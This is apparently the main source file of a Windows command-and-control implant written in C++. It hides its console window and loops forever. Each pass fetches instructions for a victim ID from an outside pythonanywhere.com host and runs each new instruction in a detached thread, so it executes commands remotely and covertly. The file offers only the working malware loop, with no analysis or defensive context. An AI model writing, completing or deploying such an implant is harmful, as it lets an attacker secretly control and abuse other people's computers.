#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <unordered_set>
#include <thread>

#include "string_functions.hh"
#include "request.hh"

#include "c2.hh"
#include "instructions_api.hh"

#include "include/json.hpp"

#define INSTRUCTION_SEP_TOKEN "%&instructionSEP&%"
#define INSTRUCTION_VAL_SEP_TOKEN "%&valSEP&%"

using json = nlohmann::json;

int main() {

    std::cout << "up and running\n";

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    std::string id = get_id();
    std::unordered_set<std::string> seen_instructions;

    while (true) {

        // receive instructions
        for (std::string ins: split_string(get_request("http://0x3af72.pythonanywhere.com/instructions/?u=" + id), INSTRUCTION_SEP_TOKEN)) {
            if (!ins.size()) continue;
            std::vector<std::string> values = split_string(ins, INSTRUCTION_VAL_SEP_TOKEN);
            if (seen_instructions.find(values[0]) != seen_instructions.end()) continue;
            seen_instructions.insert(values[0]);
            std::thread t(perform, id, values);
            t.detach();
        }

        Sleep(1000);
    }

}